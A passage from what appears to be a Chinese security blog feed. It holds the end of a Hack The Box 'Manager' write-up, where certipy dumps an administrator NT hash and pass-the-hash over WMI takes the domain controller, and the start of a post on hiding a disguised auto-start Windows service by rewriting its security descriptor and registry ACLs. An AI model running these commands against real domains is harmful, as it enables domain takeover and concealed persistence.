&lt;h3 id=&#34;23导出hashpth横向&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23导出hashpth横向&#34;&gt;#&lt;/a&gt; 2.3. 导出 hash，pth 横向&lt;/h3&gt;
&lt;h4 id=&#34;231与域控时间同步不然无法登录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#231与域控时间同步不然无法登录&#34;&gt;#&lt;/a&gt; 2.3.1. 与域控时间同步，不然无法登录&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;linux 同步命令：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo ntpdate -s 10.10.11.236 &lt;span class=&#34;comment&#34;&gt;#ip为域控ip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;win 同步命令：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sc start w32time &lt;span class=&#34;comment&#34;&gt;#启动服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;w32tm /config /manualpeerlist:&lt;span class=&#34;string&#34;&gt;&amp;quot;10.129.102.122&amp;quot;&lt;/span&gt; /syncfromflags:manual /reliable:YES /update &lt;span class=&#34;comment&#34;&gt;#同步域控时间，ip为域控ip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;232通过下载好的证书认证文件dump域管hash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#232通过下载好的证书认证文件dump域管hash&#34;&gt;#&lt;/a&gt; 2.3.2. 通过下载好的证书认证文件 dump 域管 hash&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;certipy auth -pfx &lt;span class=&#34;string&#34;&gt;&amp;#x27;administrator.pfx&amp;#x27;&lt;/span&gt; -username &lt;span class=&#34;string&#34;&gt;&amp;#x27;administrator&amp;#x27;&lt;/span&gt; -domain &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager.htb&amp;#x27;&lt;/span&gt; -dc-ip 10.10.11.236&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;执行结果如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PS D:\miniconda\Scripts&amp;gt; certipy auth -pfx &lt;span class=&#34;string&#34;&gt;&amp;#x27;administrator.pfx&amp;#x27;&lt;/span&gt; -username &lt;span class=&#34;string&#34;&gt;&amp;#x27;administrator&amp;#x27;&lt;/span&gt; -domain &lt;span class=&#34;string&#34;&gt;&amp;#x27;manager.htb&amp;#x27;&lt;/span&gt; -dc-ip 10.10.11.236&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Certipy v4.8.2 - by Oliver Lyak (ly4k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Using principal: administrator@manager.htb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Trying to get TGT...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Got TGT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Saved credential cache to &lt;span class=&#34;string&#34;&gt;&amp;#x27;administrator.ccache&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Trying to retrieve NT &lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;administrator&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Got &lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;administrator@manager.htb&amp;#x27;&lt;/span&gt;: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;233pthhash横向拿下域控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#233pthhash横向拿下域控&#34;&gt;#&lt;/a&gt; 2.3.3.pth/hash 横向拿下域控&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nxc.exe wmi 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef -x &lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;执行结果如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PS E:\渗透工具\提权+内网\密码喷洒&amp;gt; .\nxc.exe wmi 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef -x &lt;span class=&#34;string&#34;&gt;&amp;#x27;whoami&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RPC         10.10.11.236    135    DC01             [*] Windows NT 10.0 Build 17763 (name:DC01) (domain:manager.htb)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WMI         10.10.11.236    135    DC01             [+] manager.htb\administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WMI         10.10.11.236    135    DC01             [+] Executed &lt;span class=&#34;built_in&#34;&gt;command&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt; via wmiexec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WMI         10.10.11.236    135    DC01             manager\administrator&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;三注意与踩坑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三注意与踩坑&#34;&gt;#&lt;/a&gt; 三。注意与踩坑&lt;/h2&gt;
&lt;h3 id=&#34;1221创建证书处&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1221创建证书处&#34;&gt;#&lt;/a&gt; 1. &lt;code&gt;2.2.1.创建证书&lt;/code&gt; 处：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;ca 名称（-ca &#39;manager-DC01-CA&#39;），需要从 &lt;code&gt;2.1.查看域用户配置&lt;/code&gt; ，响应结果中的 ca name 中拿到&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;2224签发和批准证书处&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2224签发和批准证书处&#34;&gt;#&lt;/a&gt; 2. &lt;code&gt;2.2.4.签发和批准证书&lt;/code&gt; 处：&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;请求的证书 id（-issue-request 26），需要从 &lt;code&gt;2.2.3.请求证书&lt;/code&gt; ，响应结果中拿到&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;3时间同步&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3时间同步&#34;&gt;#&lt;/a&gt; 3. 时间同步&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;必须与域控时间同步，不然无法登录（ &lt;code&gt;2.3.1.与域控时间同步&lt;/code&gt; ）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;番外：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Certipy 命令&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;usage: certipy shadow [-h] [-account target account] [-device-id DEVICE_ID] [-debug] [-out output file name] [-scheme ldap scheme] [-dc-ip ip address] [-target-ip ip address] [-target dns/ip address] [-ns nameserver] [-dns-tcp] [-&lt;span class=&#34;built_in&#34;&gt;timeout&lt;/span&gt; seconds] [-u username@domain]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      [-p password] [-hashes [LMHASH:]NTHASH] [-k] [-sspi] [-aes hex key] [-no-pass]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      &amp;#123;list,add,remove,clear,info,auto&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;positional arguments:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;list,add,remove,clear,info,auto&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Key Credentials action&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;optional arguments:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -h, --&lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt;            show this &lt;span class=&#34;built_in&#34;&gt;help&lt;/span&gt; message and &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -account target account&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Account to target. If omitted, the user specified &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; the target will be used&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -device-id DEVICE_ID  Device ID of the Key Credential Link&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -debug                Turn debug output on&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;output options:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -out output file name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;connection options:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -scheme ldap scheme&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; the target parameter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -target-ip ip address&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -target dns/ip address&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        DNS Name or IP Address of the target machine. Required &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; Kerberos or SSPI authentication&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -ns nameserver        Nameserver &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; DNS resolution&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -dns-tcp              Use TCP instead of UDP &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; DNS queries&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -&lt;span class=&#34;built_in&#34;&gt;timeout&lt;/span&gt; seconds      Timeout &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; connections&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;authentication options:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -u username@domain, -username username@domain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Username. Format: username@domain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -p password, -password password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        Password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -hashes [LMHASH:]NTHASH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        NTLM &lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;, format is [LMHASH:]NTHASH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; the &lt;span class=&#34;built_in&#34;&gt;command&lt;/span&gt; line&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -sspi                 Use Windows Integrated Authentication (SSPI)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -aes hex key          AES key to use &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; Kerberos Authentication (128 or 256 bits)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -no-pass              Don&lt;span class=&#34;string&#34;&gt;&amp;#x27;t ask for password (useful for -k and -sspi)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</guid>
            <title>win权限维持/安全描述符权限维持</title>
            <link>http://example.com/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</link>
            <category>权限维持</category>
            <pubDate>Mon, 22 Jan 2024 00:30:34 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;竹林寺&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;cmd powershell 二选一&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;1cmd创建自启动服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1cmd创建自启动服务&#34;&gt;#&lt;/a&gt; 1.cmd 创建自启动服务&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sc create &lt;span class=&#34;string&#34;&gt;&amp;quot;.NET CLR Networking 3.5.0.0&amp;quot;&lt;/span&gt; binpath= &lt;span class=&#34;string&#34;&gt;&amp;quot;cmd.exe /k C:\test.txt&amp;quot;&lt;/span&gt; depend= Tcpip obj= Localsystem start= auto  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;2-powershell创建自启动服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-powershell创建自启动服务&#34;&gt;#&lt;/a&gt; 2. powershell 创建自启动服务&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;new-service&lt;/span&gt; –Name &lt;span class=&#34;string&#34;&gt;&amp;quot;.NET CLR Networking 3.5.0.0&amp;quot;&lt;/span&gt; –DisplayName &lt;span class=&#34;string&#34;&gt;&amp;quot;.NET CLR Networking 3.5.0.0&amp;quot;&lt;/span&gt; –BinaryPathName &lt;span class=&#34;string&#34;&gt;&amp;quot;cmd.exe /k C:\test.txt&amp;quot;&lt;/span&gt; – StartupType AutomaticDelayedStart  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;new-service&lt;/span&gt; –Name &lt;span class=&#34;string&#34;&gt;&amp;quot;.NET CLR Networking 3.5.0.0&amp;quot;&lt;/span&gt; –DisplayName &lt;span class=&#34;string&#34;&gt;&amp;quot;.NET CLR Networking 3.5.0.0&amp;quot;&lt;/span&gt; –BinaryPathName &lt;span class=&#34;string&#34;&gt;&amp;quot;cmd.exe /k C:\test.txt&amp;quot;&lt;/span&gt; –StartupType AutomaticDelayedStart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;3-通过修改sddl安全描述符隐藏服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-通过修改sddl安全描述符隐藏服务&#34;&gt;#&lt;/a&gt; 3. 通过修改 SDDL (安全描述符) 隐藏服务&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sc sdset &lt;span class=&#34;string&#34;&gt;&amp;quot;.NET CLR Networking 3.5.0.0&amp;quot;&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;D:(D;;DCLCWPDTSD;;;IU) (D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU) (A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY) (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&amp;quot;&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;4-然后通过sc与get-server查找服务均无结果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-然后通过sc与get-server查找服务均无结果&#34;&gt;#&lt;/a&gt; 4. 然后通过 sc 与 get-server 查找服务均无结果：&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; sc query |findstr &lt;span class=&#34;string&#34;&gt;&amp;quot;.NET CLR Networking 3.5.0.0&amp;quot;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get-service | findstr &lt;span class=&#34;string&#34;&gt;&amp;quot;.NET CLR Networking 3.5.0.0&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;img data-src=&#34;%5Cassets%5Cimage.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;5-但这样做有一个问题在注册表中很容易看到异常value&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-但这样做有一个问题在注册表中很容易看到异常value&#34;&gt;#&lt;/a&gt; 5. 但这样做有一个问题：在注册表中很容易看到异常 value。&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.nlark.com/yuque/0/2022/png/22015580/1645973156783-c89ae77b-148f-4bcd-9970-b9351192a402.png#averageHue=%23fbfbfa&amp;amp;clientId=ua1aa948f-0eae-4&amp;amp;from=paste&amp;amp;height=289&amp;amp;id=ubc5fdbca&amp;amp;originHeight=289&amp;amp;originWidth=928&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=76377&amp;amp;status=done&amp;amp;style=none&amp;amp;taskId=u36ac8e23-c73c-4683-8a7f-e87128fbc25&amp;amp;title=&amp;amp;width=928&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;6-修改注册表acl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6-修改注册表acl&#34;&gt;#&lt;/a&gt; 6. 修改注册表 ACL&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;我们可以通过修改注册表的 DACL 来拒绝对值的查询，达到隐藏异常值的效果。&lt;/strong&gt;&lt;br /&gt;
** 这里给出一个通过 powershell 修改注册表项的访问权限的简单脚本：   **&lt;/p&gt;
